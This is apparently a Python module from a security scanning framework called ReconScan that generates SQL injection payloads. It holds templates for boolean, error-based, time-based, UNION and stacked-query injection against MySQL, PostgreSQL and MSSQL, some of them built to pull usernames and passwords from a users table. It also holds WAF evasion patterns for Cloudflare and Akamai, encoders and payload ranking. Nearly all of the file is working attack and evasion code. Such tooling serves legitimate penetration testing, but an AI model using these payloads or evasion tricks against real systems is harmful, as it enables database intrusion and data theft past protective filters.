"""
ReconScan SQL Injection Payload Crafting Engine

Professional payload generation system for SQL injection testing with capabilities
matching industry-leading tools. Features dynamic templates, context-aware generation,
database-specific targeting, and advanced WAF evasion techniques.

This module serves as the core payload generation engine for the SQL injection scanner,
providing intelligent, adaptive payloads based on injection point analysis and target
characteristics.

Author: ReconScan Security Framework
Version: 1.0.0
"""

import re
import random
import string
import base64
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any, Set, Union
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
import json
import hashlib

# Import our injection discovery components from shared module
from ...shared.injection_discovery import InjectionPoint, InjectionPointType, ParameterType

class DatabaseType(Enum):
    """Supported database management systems."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    MARIADB = "mariadb"
    MONGODB = "mongodb"
    UNKNOWN = "unknown"

class InjectionTechnique(Enum):
    """SQL injection attack techniques."""
    BOOLEAN_BASED = "boolean"
    ERROR_BASED = "error"
    TIME_BASED = "time"
    UNION_BASED = "union"
    STACKED_QUERIES = "stacked"
    SECOND_ORDER = "second_order"
    BLIND_XPATH = "xpath"

class EncodingType(Enum):
    """Payload encoding and evasion types."""
    NONE = "none"
    URL_ENCODE = "url"
    DOUBLE_URL_ENCODE = "double_url"
    UNICODE_ENCODE = "unicode"
    HEX_ENCODE = "hex"
    BASE64_ENCODE = "base64"
    HTML_ENTITY = "html"
    CHAR_FUNCTION = "char"
    CONCAT_FUNCTION = "concat"

@dataclass
class PayloadTemplate:
    """
    Represents a payload template with dynamic substitution capabilities.
    
    Templates support placeholders for dynamic content generation:
    - {PREFIX} - Injection prefix (e.g., ', ", ), etc.)
    - {SUFFIX} - Injection suffix (e.g., --, #, /**/, etc.)
    - {QUOTE} - Quote character based on context
    - {PAYLOAD} - Core payload content
    - {DELAY} - Time delay for time-based attacks
    - {COLUMNS} - Column count for UNION attacks
    - {DB_SPECIFIC} - Database-specific syntax
    """
    
    id: str                              # Unique template identifier
    name: str                            # Human-readable name
    technique: InjectionTechnique        # Attack technique type
    database: DatabaseType               # Target database type
    template: str                        # Payload template string
    description: str                     # Template description
    risk_level: int = 3                  # Risk level (1-5, 5=highest)
    requires_columns: bool = False       # Whether UNION attack needs column count
    time_delay: float = 5.0              # Default time delay for time-based
    success_indicators: List[str] = field(default_factory=list)  # Response indicators
    failure_indicators: List[str] = field(default_factory=list)  # Failure indicators
    
    def render(self, context: Dict[str, Any]) -> str:
        """
        Render the template with provided context variables.
        
        Args:
            context: Dictionary of template variables
            
        Returns:
            Rendered payload string
        """
        payload = self.template
        
        # Apply context substitutions
        for key, value in context.items():
            placeholder = "{" + key.upper() + "}"
            if placeholder in payload:
                payload = payload.replace(placeholder, str(value))
        
        return payload

@dataclass
class PayloadCraftingContext:
    """Context information for intelligent payload crafting."""
    
    injection_point: InjectionPoint      # Target injection point
    database_type: DatabaseType = DatabaseType.UNKNOWN
    detected_waf: Optional[str] = None   # Detected WAF type
    encoding_requirements: List[EncodingType] = field(default_factory=list)
    column_count: Optional[int] = None   # For UNION-based attacks
    time_delay: float = 5.0              # Time delay for blind attacks
    prefix_chars: List[str] = field(default_factory=lambda: ["'", '"', ")", "')"])
    suffix_chars: List[str] = field(default_factory=lambda: ["--", "#", "/**/"])
    custom_variables: Dict[str, Any] = field(default_factory=dict)
    
    def get_quote_char(self) -> str:
        """Get appropriate quote character based on parameter type."""
        if self.injection_point.parameter_type == ParameterType.NUMERIC:
            return ""
        elif self.injection_point.parameter_type == ParameterType.JSON_OBJECT:
            return '"'
        else:
            return "'"

class PayloadCraftingEngine:
    """
    Professional SQL injection payload crafting engine.
    
    This engine provides comprehensive payload generation capabilities including:
    
    - Dynamic template-based payload generation
    - Context-aware payload adaptation
    - Database-specific payload optimization
    - Advanced WAF evasion techniques
    - Intelligent payload mutation
    - Performance-optimized payload selection
    
    The engine integrates seamlessly with injection point discovery to provide
    targeted, effective payloads for each identified attack surface.
    """
    
    def __init__(self):
        """Initialize the payload crafting engine with templates and configurations."""
        
        # Core payload templates organized by technique and database
        self.templates: Dict[InjectionTechnique, Dict[DatabaseType, List[PayloadTemplate]]] = {}
        
        # WAF evasion patterns and techniques
        self.waf_evasion_patterns = {}
        
        # Encoding transformation functions
        self.encoders = {}
        
        # Success rate tracking for adaptive learning
        self.payload_success_rates = {}
        
        # Initialize all components
        self._initialize_templates()
        self._initialize_encoders()
        self._initialize_waf_evasion()
        
        # TODO: Implement machine learning model for payload effectiveness prediction
        # TODO: Add support for custom payload templates from configuration files
        # FIXME: Optimize template loading for better startup performance
        
    def _initialize_templates(self):
        """Initialize comprehensive payload template library."""
        
        # Boolean-based blind injection templates
        self._load_boolean_based_templates()
        
        # Error-based injection templates
        self._load_error_based_templates()
        
        # Time-based blind injection templates
        self._load_time_based_templates()
        
        # UNION-based injection templates
        self._load_union_based_templates()
        
        # Stacked queries templates
        self._load_stacked_queries_templates()
        
    def _load_boolean_based_templates(self):
        """Load boolean-based blind injection templates."""
        if InjectionTechnique.BOOLEAN_BASED not in self.templates:
            self.templates[InjectionTechnique.BOOLEAN_BASED] = {}
        
        # MySQL boolean-based templates
        mysql_boolean_templates = [
            PayloadTemplate(
                id="mysql_bool_basic_and",
                name="MySQL Boolean Basic AND",
                technique=InjectionTechnique.BOOLEAN_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND {CONDITION}{SUFFIX}",
                description="Basic MySQL boolean injection using AND condition",
                success_indicators=["different response length", "content differences"],
                failure_indicators=["same response", "error messages"]
            ),
            PayloadTemplate(
                id="mysql_bool_substr",
                name="MySQL Boolean SUBSTRING",
                technique=InjectionTechnique.BOOLEAN_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND ASCII(SUBSTRING((SELECT {QUERY}),{POSITION},1))>{ASCII_VALUE}{SUFFIX}",
                description="MySQL character-by-character extraction using SUBSTRING and ASCII",
                success_indicators=["response variation based on ASCII value"]
            ),
            PayloadTemplate(
                id="mysql_bool_length",
                name="MySQL Boolean LENGTH",
                technique=InjectionTechnique.BOOLEAN_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND LENGTH((SELECT {QUERY}))>{LENGTH_VALUE}{SUFFIX}",
                description="MySQL length-based boolean injection for data size determination"
            ),
            PayloadTemplate(
                id="mysql_bool_exists",
                name="MySQL Boolean EXISTS",
                technique=InjectionTechnique.BOOLEAN_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND EXISTS(SELECT * FROM {TABLE} WHERE {CONDITION}){SUFFIX}",
                description="MySQL existence-based boolean injection for table/data discovery"
            )
        ]
        
        # PostgreSQL boolean-based templates
        postgresql_boolean_templates = [
            PayloadTemplate(
                id="postgresql_bool_basic",
                name="PostgreSQL Boolean Basic",
                technique=InjectionTechnique.BOOLEAN_BASED,
                database=DatabaseType.POSTGRESQL,
                template="{PREFIX} AND {CONDITION}{SUFFIX}",
                description="Basic PostgreSQL boolean injection"
            ),
            PayloadTemplate(
                id="postgresql_bool_substr",
                name="PostgreSQL Boolean SUBSTR",
                technique=InjectionTechnique.BOOLEAN_BASED,
                database=DatabaseType.POSTGRESQL,
                template="{PREFIX} AND ASCII(SUBSTR((SELECT {QUERY}),{POSITION},1))>{ASCII_VALUE}{SUFFIX}",
                description="PostgreSQL character extraction using SUBSTR and ASCII"
            )
        ]
        
        # MSSQL boolean-based templates
        mssql_boolean_templates = [
            PayloadTemplate(
                id="mssql_bool_basic",
                name="MSSQL Boolean Basic",
                technique=InjectionTechnique.BOOLEAN_BASED,
                database=DatabaseType.MSSQL,
                template="{PREFIX} AND {CONDITION}{SUFFIX}",
                description="Basic MSSQL boolean injection"
            ),
            PayloadTemplate(
                id="mssql_bool_substring",
                name="MSSQL Boolean SUBSTRING",
                technique=InjectionTechnique.BOOLEAN_BASED,
                database=DatabaseType.MSSQL,
                template="{PREFIX} AND ASCII(SUBSTRING((SELECT {QUERY}),{POSITION},1))>{ASCII_VALUE}{SUFFIX}",
                description="MSSQL character extraction using SUBSTRING and ASCII"
            )
        ]
        
        # Store templates
        self.templates[InjectionTechnique.BOOLEAN_BASED][DatabaseType.MYSQL] = mysql_boolean_templates
        self.templates[InjectionTechnique.BOOLEAN_BASED][DatabaseType.POSTGRESQL] = postgresql_boolean_templates
        self.templates[InjectionTechnique.BOOLEAN_BASED][DatabaseType.MSSQL] = mssql_boolean_templates
        
    def _load_error_based_templates(self):
        """Load error-based injection templates."""
        if InjectionTechnique.ERROR_BASED not in self.templates:
            self.templates[InjectionTechnique.ERROR_BASED] = {}
        
        # MySQL error-based templates
        mysql_error_templates = [
            PayloadTemplate(
                id="mysql_error_extractvalue",
                name="MySQL Error EXTRACTVALUE",
                technique=InjectionTechnique.ERROR_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {QUERY}),0x7e)){SUFFIX}",
                description="MySQL error-based injection using EXTRACTVALUE function",
                success_indicators=["XPATH syntax error", "data in error message"],
                failure_indicators=["no error", "generic error"]
            ),
            PayloadTemplate(
                id="mysql_error_updatexml",
                name="MySQL Error UPDATEXML",
                technique=InjectionTechnique.ERROR_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND UPDATEXML(1,CONCAT(0x7e,(SELECT {QUERY}),0x7e),1){SUFFIX}",
                description="MySQL error-based injection using UPDATEXML function"
            ),
            PayloadTemplate(
                id="mysql_error_floor",
                name="MySQL Error FLOOR",
                technique=InjectionTechnique.ERROR_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND (SELECT COUNT(*),CONCAT((SELECT {QUERY}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x){SUFFIX}",
                description="MySQL error-based injection using FLOOR and RAND functions"
            ),
            PayloadTemplate(
                id="mysql_error_exp",
                name="MySQL Error EXP",
                technique=InjectionTechnique.ERROR_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND EXP(~(SELECT * FROM (SELECT (SELECT {QUERY}))a)){SUFFIX}",
                description="MySQL error-based injection using EXP function overflow"
            )
        ]
        
        # PostgreSQL error-based templates
        postgresql_error_templates = [
            PayloadTemplate(
                id="postgresql_error_cast",
                name="PostgreSQL Error CAST",
                technique=InjectionTechnique.ERROR_BASED,
                database=DatabaseType.POSTGRESQL,
                template="{PREFIX} AND CAST((SELECT {QUERY}) AS int){SUFFIX}",
                description="PostgreSQL error-based injection using CAST type conversion"
            ),
            PayloadTemplate(
                id="postgresql_error_array",
                name="PostgreSQL Error Array",
                technique=InjectionTechnique.ERROR_BASED,
                database=DatabaseType.POSTGRESQL,
                template="{PREFIX} AND (SELECT ARRAY_AGG((SELECT {QUERY})))[1]{SUFFIX}",
                description="PostgreSQL error-based injection using array operations"
            )
        ]
        
        # MSSQL error-based templates
        mssql_error_templates = [
            PayloadTemplate(
                id="mssql_error_convert",
                name="MSSQL Error CONVERT",
                technique=InjectionTechnique.ERROR_BASED,
                database=DatabaseType.MSSQL,
                template="{PREFIX} AND CONVERT(int,(SELECT {QUERY})){SUFFIX}",
                description="MSSQL error-based injection using CONVERT function"
            ),
            PayloadTemplate(
                id="mssql_error_cast",
                name="MSSQL Error CAST",
                technique=InjectionTechnique.ERROR_BASED,
                database=DatabaseType.MSSQL,
                template="{PREFIX} AND CAST((SELECT {QUERY}) AS int){SUFFIX}",
                description="MSSQL error-based injection using CAST function"
            )
        ]
        
        # Store templates
        self.templates[InjectionTechnique.ERROR_BASED][DatabaseType.MYSQL] = mysql_error_templates
        self.templates[InjectionTechnique.ERROR_BASED][DatabaseType.POSTGRESQL] = postgresql_error_templates
        self.templates[InjectionTechnique.ERROR_BASED][DatabaseType.MSSQL] = mssql_error_templates
        
    def _load_time_based_templates(self):
        """Load time-based blind injection templates."""
        if InjectionTechnique.TIME_BASED not in self.templates:
            self.templates[InjectionTechnique.TIME_BASED] = {}
        
        # MySQL time-based templates
        mysql_time_templates = [
            PayloadTemplate(
                id="mysql_time_sleep",
                name="MySQL Time SLEEP",
                technique=InjectionTechnique.TIME_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND IF({CONDITION},SLEEP({DELAY}),0){SUFFIX}",
                description="MySQL time-based injection using SLEEP function",
                time_delay=5.0,
                success_indicators=["response delay >= {DELAY} seconds"]
            ),
            PayloadTemplate(
                id="mysql_time_benchmark",
                name="MySQL Time BENCHMARK",
                technique=InjectionTechnique.TIME_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND IF({CONDITION},BENCHMARK(10000000,MD5(1)),0){SUFFIX}",
                description="MySQL time-based injection using BENCHMARK function"
            ),
            PayloadTemplate(
                id="mysql_time_select_sleep",
                name="MySQL Time SELECT SLEEP",
                technique=InjectionTechnique.TIME_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} AND (SELECT * FROM (SELECT(SLEEP({DELAY})))a){SUFFIX}",
                description="MySQL time-based injection using subquery SLEEP"
            )
        ]
        
        # PostgreSQL time-based templates
        postgresql_time_templates = [
            PayloadTemplate(
                id="postgresql_time_pg_sleep",
                name="PostgreSQL Time PG_SLEEP",
                technique=InjectionTechnique.TIME_BASED,
                database=DatabaseType.POSTGRESQL,
                template="{PREFIX} AND (CASE WHEN {CONDITION} THEN PG_SLEEP({DELAY}) ELSE PG_SLEEP(0) END){SUFFIX}",
                description="PostgreSQL time-based injection using PG_SLEEP function"
            ),
            PayloadTemplate(
                id="postgresql_time_generate_series",
                name="PostgreSQL Time Generate Series",
                technique=InjectionTechnique.TIME_BASED,
                database=DatabaseType.POSTGRESQL,
                template="{PREFIX} AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000) WHERE {CONDITION}){SUFFIX}",
                description="PostgreSQL time-based injection using GENERATE_SERIES"
            )
        ]
        
        # MSSQL time-based templates
        mssql_time_templates = [
            PayloadTemplate(
                id="mssql_time_waitfor",
                name="MSSQL Time WAITFOR",
                technique=InjectionTechnique.TIME_BASED,
                database=DatabaseType.MSSQL,
                template="{PREFIX}; IF {CONDITION} WAITFOR DELAY '00:00:{DELAY:02d}'{SUFFIX}",
                description="MSSQL time-based injection using WAITFOR DELAY"
            ),
            PayloadTemplate(
                id="mssql_time_heavy_query",
                name="MSSQL Time Heavy Query",
                technique=InjectionTechnique.TIME_BASED,
                database=DatabaseType.MSSQL,
                template="{PREFIX} AND (SELECT COUNT(*) FROM sys.all_columns a, sys.all_columns b WHERE {CONDITION}){SUFFIX}",
                description="MSSQL time-based injection using heavy query operations"
            )
        ]
        
        # Store templates
        self.templates[InjectionTechnique.TIME_BASED][DatabaseType.MYSQL] = mysql_time_templates
        self.templates[InjectionTechnique.TIME_BASED][DatabaseType.POSTGRESQL] = postgresql_time_templates
        self.templates[InjectionTechnique.TIME_BASED][DatabaseType.MSSQL] = mssql_time_templates
        
    def _load_union_based_templates(self):
        """Load UNION-based injection templates."""
        if InjectionTechnique.UNION_BASED not in self.templates:
            self.templates[InjectionTechnique.UNION_BASED] = {}
        
        # Universal UNION templates (work across most databases)
        universal_union_templates = [
            PayloadTemplate(
                id="union_basic_select",
                name="Basic UNION SELECT",
                technique=InjectionTechnique.UNION_BASED,
                database=DatabaseType.UNKNOWN,
                template="{PREFIX} UNION SELECT {COLUMNS}{SUFFIX}",
                description="Basic UNION injection for data extraction",
                requires_columns=True,
                success_indicators=["additional data in response", "new columns visible"]
            ),
            PayloadTemplate(
                id="union_order_by",
                name="UNION ORDER BY",
                technique=InjectionTechnique.UNION_BASED,
                database=DatabaseType.UNKNOWN,
                template="{PREFIX} ORDER BY {COLUMN_NUMBER}{SUFFIX}",
                description="Column enumeration using ORDER BY for UNION attacks",
                requires_columns=True
            ),
            PayloadTemplate(
                id="union_null_discovery",
                name="UNION NULL Discovery",
                technique=InjectionTechnique.UNION_BASED,
                database=DatabaseType.UNKNOWN,
                template="{PREFIX} UNION SELECT {NULL_COLUMNS}{SUFFIX}",
                description="UNION injection using NULL values for column discovery",
                requires_columns=True
            )
        ]
        
        # MySQL-specific UNION templates
        mysql_union_templates = [
            PayloadTemplate(
                id="mysql_union_information_schema",
                name="MySQL UNION Information Schema",
                technique=InjectionTechnique.UNION_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} UNION SELECT table_name,column_name,{NULLS} FROM information_schema.columns{SUFFIX}",
                description="MySQL UNION injection targeting information_schema",
                requires_columns=True
            ),
            PayloadTemplate(
                id="mysql_union_concat",
                name="MySQL UNION CONCAT",
                technique=InjectionTechnique.UNION_BASED,
                database=DatabaseType.MYSQL,
                template="{PREFIX} UNION SELECT CONCAT({FIELDS}),{NULLS} FROM {TABLE}{SUFFIX}",
                description="MySQL UNION injection with CONCAT for field combination",
                requires_columns=True
            )
        ]
        
        # Store templates
        self.templates[InjectionTechnique.UNION_BASED][DatabaseType.UNKNOWN] = universal_union_templates
        self.templates[InjectionTechnique.UNION_BASED][DatabaseType.MYSQL] = mysql_union_templates
        
    def _load_stacked_queries_templates(self):
        """Load stacked queries injection templates."""
        if InjectionTechnique.STACKED_QUERIES not in self.templates:
            self.templates[InjectionTechnique.STACKED_QUERIES] = {}
        
        # Universal stacked queries templates
        universal_stacked_templates = [
            PayloadTemplate(
                id="stacked_basic_select",
                name="Stacked Basic SELECT",
                technique=InjectionTechnique.STACKED_QUERIES,
                database=DatabaseType.UNKNOWN,
                template="{PREFIX}; SELECT {QUERY}{SUFFIX}",
                description="Basic stacked query for additional SQL execution"
            ),
            PayloadTemplate(
                id="stacked_time_delay",
                name="Stacked Time Delay",
                technique=InjectionTechnique.STACKED_QUERIES,
                database=DatabaseType.UNKNOWN,
                template="{PREFIX}; {TIME_FUNCTION}({DELAY}){SUFFIX}",
                description="Stacked query with time delay for confirmation"
            )
        ]
        
        # Store templates
        self.templates[InjectionTechnique.STACKED_QUERIES][DatabaseType.UNKNOWN] = universal_stacked_templates
        
    def _initialize_encoders(self):
        """Initialize payload encoding functions for WAF evasion."""
        
        self.encoders = {
            EncodingType.URL_ENCODE: self._url_encode,
            EncodingType.DOUBLE_URL_ENCODE: self._double_url_encode,
            EncodingType.UNICODE_ENCODE: self._unicode_encode,
            EncodingType.HEX_ENCODE: self._hex_encode,
            EncodingType.BASE64_ENCODE: self._base64_encode,
            EncodingType.HTML_ENTITY: self._html_entity_encode,
            EncodingType.CHAR_FUNCTION: self._char_function_encode,
            EncodingType.CONCAT_FUNCTION: self._concat_function_encode
        }
        
    def _initialize_waf_evasion(self):
        """Initialize WAF-specific evasion patterns."""
        
        self.waf_evasion_patterns = {
            'cloudflare': {
                'space_replacements': ['\t', '\n', '\r', '/**/', '+', '%20', '%09', '%0a', '%0d'],
                'keyword_obfuscation': {
                    'SELECT': ['SeLeCt', 'SE/**/LECT', 'S%45LECT', 'SE\x4cECT'],
                    'UNION': ['Un/**/Ion', 'UN%49ON', 'U\x4eION', 'UNI/**/ON'],
                    'AND': ['AN/**/D', 'A%4eD', '&&', 'A\x4eD'],
                    'OR': ['O/**/R', '%4fR', '||', 'O\x52']
                },
                'comment_variations': ['/**/', '/*--*/', '/*!50000*/', '/*!50000SELECT*/']
            },
            'akamai': {
                'space_replacements': ['\t', '%09', '%0a', '%0b', '%0c', '%0d', '%a0'],
                'keyword_obfuscation': {
                    'SELECT': ['select', 'Select', 'sElEcT', 'SE%4cECT'],
                    'UNION': ['union', 'Union', 'uNiOn', 'UN%49ON'],
                    'AND': ['and', 'And', 'aNd', '&&'],
                    'OR': ['or', 'Or', 'oR', '||']
                }
            },
            'generic': {
                'space_replacements': ['\t', '\n', '/**/', '+', '%20'],
                'keyword_obfuscation': {
                    'SELECT': ['SeLeCt', 'SE/**/LECT'],
                    'UNION': ['Un/**/Ion', 'UNI/**/ON'],
                    'AND': ['AN/**/D', '&&'],
                    'OR': ['O/**/R', '||']
                }
            }
        }
        
    def craft_payloads(self, 
                      injection_point: InjectionPoint,
                      techniques: List[InjectionTechnique] = None,
                      database_types: List[DatabaseType] = None,
                      max_payloads: int = 100) -> List[Tuple[str, PayloadTemplate]]:
        """
        Craft comprehensive payloads for a given injection point.
        
        Args:
            injection_point: Target injection point from discovery
            techniques: Specific techniques to use (all if None)
            database_types: Target database types (all if None)
            max_payloads: Maximum number of payloads to generate
            
        Returns:
            List of (payload, template) tuples sorted by effectiveness probability
        """
        context = PayloadCraftingContext(injection_point=injection_point)
        
        # Default to all techniques if none specified
        if techniques is None:
            techniques = list(InjectionTechnique)
        
        # Default to common database types if none specified
        if database_types is None:
            database_types = [DatabaseType.MYSQL, DatabaseType.POSTGRESQL, DatabaseType.MSSQL, DatabaseType.UNKNOWN]
        
        generated_payloads = []
        
        # Generate payloads for each technique and database combination
        for technique in techniques:
            if technique not in self.templates:
                continue
                
            for db_type in database_types:
                if db_type not in self.templates[technique]:
                    continue
                
                templates = self.templates[technique][db_type]
                
                for template in templates:
                    # Generate base payload variants
                    base_payloads = self._generate_template_variants(template, context)
                    
                    for payload in base_payloads:
                        generated_payloads.append((payload, template))
        
        # Apply intelligent scoring and filtering
        scored_payloads = self._score_and_rank_payloads(generated_payloads, context)
        
        # Apply WAF evasion if needed
        evasive_payloads = self._apply_waf_evasion(scored_payloads[:max_payloads//2], context)
        
        # Combine and return top payloads
        all_payloads = scored_payloads + evasive_payloads
        return all_payloads[:max_payloads]
        
    def _generate_template_variants(self, 
                                  template: PayloadTemplate, 
                                  context: PayloadCraftingContext) -> List[str]:
        """Generate multiple variants of a payload template."""
        variants = []
        
        # Generate different prefix/suffix combinations
        prefixes = self._get_contextual_prefixes(context)
        suffixes = self._get_contextual_suffixes(context)
        
        for prefix in prefixes[:3]:  # Limit combinations for performance
            for suffix in suffixes[:3]:
                
                # Build template context
                template_context = {
                    'prefix': prefix,
                    'suffix': suffix,
                    'quote': context.get_quote_char(),
                    'delay': context.time_delay,
                    'condition': 'LEN(DATABASE())>0',  # Default condition
                    'query': 'database()',  # Default query
                    'table': 'users',  # Default table
                    'columns': '1,2,3',  # Default columns
                    'null_columns': 'NULL,NULL,NULL',
                    'nulls': 'NULL,NULL',
                    'position': '1',
                    'ascii_value': '65',
                    'length_value': '5',
                    'column_number': '1',
                    'fields': 'username,password'
                }
                
                # Add custom variables from context
                template_context.update(context.custom_variables)
                
                # Render template
                try:
                    payload = template.render(template_context)
                    if payload and payload not in variants:
                        variants.append(payload)
                except Exception:
                    # Skip invalid template renderings
                    continue
        
        return variants
        
    def _get_contextual_prefixes(self, context: PayloadCraftingContext) -> List[str]:
        """Get appropriate prefixes based on injection point context."""
        base_prefixes = []
        
        # Determine prefixes based on parameter type
        if context.injection_point.parameter_type == ParameterType.NUMERIC:
            base_prefixes = ["", " "]
        elif context.injection_point.parameter_type == ParameterType.STRING:
            base_prefixes = ["'", "\"", "') ", "\") "]
        elif context.injection_point.parameter_type == ParameterType.JSON_OBJECT:
            base_prefixes = ["\",\"injection\":\"", "\",\"test\":\""]
        else:
            base_prefixes = ["'", "\"", ")", "')", "\")"]
        
        # Add common universal prefixes
        base_prefixes.extend(["' ", "\" ", ") ", "') ", "\") "])
        
        return list(set(base_prefixes))  # Remove duplicates
        
    def _get_contextual_suffixes(self, context: PayloadCraftingContext) -> List[str]:
        """Get appropriate suffixes based on injection point context."""
        base_suffixes = ["--", "#", "/**/", " --", " #"]
        
        # Add context-specific suffixes
        if context.injection_point.injection_type == InjectionPointType.QUERY_PARAMETER:
            base_suffixes.extend(["", "&", "%20--", "%23"])
        elif context.injection_point.injection_type == InjectionPointType.JSON_FIELD:
            base_suffixes.extend(["\",\"continue\":\"value", "\"}}"])
        
        return base_suffixes
        
    def _score_and_rank_payloads(self, 
                                payloads: List[Tuple[str, PayloadTemplate]], 
                                context: PayloadCraftingContext) -> List[Tuple[str, PayloadTemplate]]:
        """Score and rank payloads based on effectiveness probability."""
        scored_payloads = []
        
        for payload, template in payloads:
            score = self._calculate_payload_score(payload, template, context)
            scored_payloads.append((payload, template, score))
        
        # Sort by score descending
        scored_payloads.sort(key=lambda x: x[2], reverse=True)
        
        # Return without scores
        return [(payload, template) for payload, template, score in scored_payloads]
        
    def _calculate_payload_score(self, 
                                payload: str, 
                                template: PayloadTemplate, 
                                context: PayloadCraftingContext) -> float:
        """Calculate effectiveness score for a payload."""
        score = 0.5  # Base score
        
        # Template-based scoring
        score += template.risk_level * 0.1
        
        # Technique-based scoring
        technique_scores = {
            InjectionTechnique.BOOLEAN_BASED: 0.8,
            InjectionTechnique.ERROR_BASED: 0.9,
            InjectionTechnique.TIME_BASED: 0.7,
            InjectionTechnique.UNION_BASED: 0.85,
            InjectionTechnique.STACKED_QUERIES: 0.6
        }
        score += technique_scores.get(template.technique, 0.5) * 0.2
        
        # Context fitness scoring
        if context.injection_point.parameter_type == ParameterType.NUMERIC:
            if "'" not in payload and '"' not in payload:
                score += 0.15  # Bonus for numeric context
        
        # Historical success rate
        payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
        if payload_hash in self.payload_success_rates:
            score += self.payload_success_rates[payload_hash] * 0.2
        
        # Length penalty (shorter payloads often work better)
        length_penalty = min(len(payload) / 200.0, 0.3)
        score -= length_penalty
        
        return max(0.0, min(1.0, score))  # Clamp between 0 and 1
        
    def _apply_waf_evasion(self, 
                          payloads: List[Tuple[str, PayloadTemplate]], 
                          context: PayloadCraftingContext) -> List[Tuple[str, PayloadTemplate]]:
        """Apply WAF evasion techniques to payloads."""
        if not context.detected_waf:
            return []
        
        evasive_payloads = []
        waf_patterns = self.waf_evasion_patterns.get(context.detected_waf, self.waf_evasion_patterns['generic'])
        
        for payload, template in payloads:
            # Apply space replacements
            for space_replacement in waf_patterns['space_replacements'][:2]:  # Limit variants
                evasive_payload = payload.replace(' ', space_replacement)
                if evasive_payload != payload:
                    evasive_payloads.append((evasive_payload, template))
            
            # Apply keyword obfuscation
            obfuscated_payload = payload
            for keyword, obfuscations in waf_patterns['keyword_obfuscation'].items():
                if keyword in obfuscated_payload.upper():
                    for obfuscation in obfuscations[:1]:  # Use first obfuscation
                        obfuscated_payload = obfuscated_payload.replace(keyword, obfuscation)
                        break
            
            if obfuscated_payload != payload:
                evasive_payloads.append((obfuscated_payload, template))
        
        return evasive_payloads
        
    # Encoding functions for WAF evasion
    def _url_encode(self, payload: str) -> str:
        """Apply URL encoding to payload."""
        return urllib.parse.quote(payload, safe='')
        
    def _double_url_encode(self, payload: str) -> str:
        """Apply double URL encoding to payload."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        
    def _unicode_encode(self, payload: str) -> str:
        """Apply Unicode encoding to payload."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
        
    def _hex_encode(self, payload: str) -> str:
        """Apply hexadecimal encoding to payload."""
        return '0x' + payload.encode('utf-8').hex()
        
    def _base64_encode(self, payload: str) -> str:
        """Apply Base64 encoding to payload."""
        return base64.b64encode(payload.encode()).decode()
        
    def _html_entity_encode(self, payload: str) -> str:
        """Apply HTML entity encoding to payload."""
        return ''.join(f'&#{ord(c)};' for c in payload)
        
    def _char_function_encode(self, payload: str) -> str:
        """Encode payload using CHAR functions."""
        char_codes = [str(ord(c)) for c in payload]
        return f"CHAR({','.join(char_codes)})"
        
    def _concat_function_encode(self, payload: str) -> str:
        """Encode payload using CONCAT functions."""
        parts = [f"CHAR({ord(c)})" for c in payload]
        return f"CONCAT({','.join(parts)})"
        
    def update_payload_success(self, payload: str, success: bool):
        """Update success tracking for adaptive learning."""
        payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
        
        if payload_hash not in self.payload_success_rates:
            self.payload_success_rates[payload_hash] = 0.5
        
        # Simple learning rate adjustment
        current_rate = self.payload_success_rates[payload_hash]
        learning_rate = 0.1
        
        if success:
            self.payload_success_rates[payload_hash] = min(1.0, current_rate + learning_rate)
        else:
            self.payload_success_rates[payload_hash] = max(0.0, current_rate - learning_rate)
            
    def get_technique_info(self, technique: InjectionTechnique) -> Dict[str, Any]:
        """Get information about a specific injection technique."""
        technique_info = {
            InjectionTechnique.BOOLEAN_BASED: {
                'name': 'Boolean-based Blind',
                'description': 'Infers data based on True/False responses',
                'speed': 'Slow',
                'stealth': 'High',
                'reliability': 'High'
            },
            InjectionTechnique.ERROR_BASED: {
                'name': 'Error-based',
                'description': 'Extracts data through database error messages',
                'speed': 'Fast',
                'stealth': 'Medium',
                'reliability': 'High'
            },
            InjectionTechnique.TIME_BASED: {
                'name': 'Time-based Blind',
                'description': 'Infers data based on response time delays',
                'speed': 'Very Slow',
                'stealth': 'High',
                'reliability': 'Medium'
            },
            InjectionTechnique.UNION_BASED: {
                'name': 'UNION-based',
                'description': 'Extracts data using UNION SQL operator',
                'speed': 'Very Fast',
                'stealth': 'Low',
                'reliability': 'Very High'
            },
            InjectionTechnique.STACKED_QUERIES: {
                'name': 'Stacked Queries',
                'description': 'Executes multiple SQL statements',
                'speed': 'Fast',
                'stealth': 'Low',
                'reliability': 'High'
            }
        }
        
        return technique_info.get(technique, {})

# Export main classes for external use
__all__ = [
    'PayloadCraftingEngine',
    'PayloadTemplate',
    'PayloadCraftingContext',
    'DatabaseType',
    'InjectionTechnique',
    'EncodingType'
] 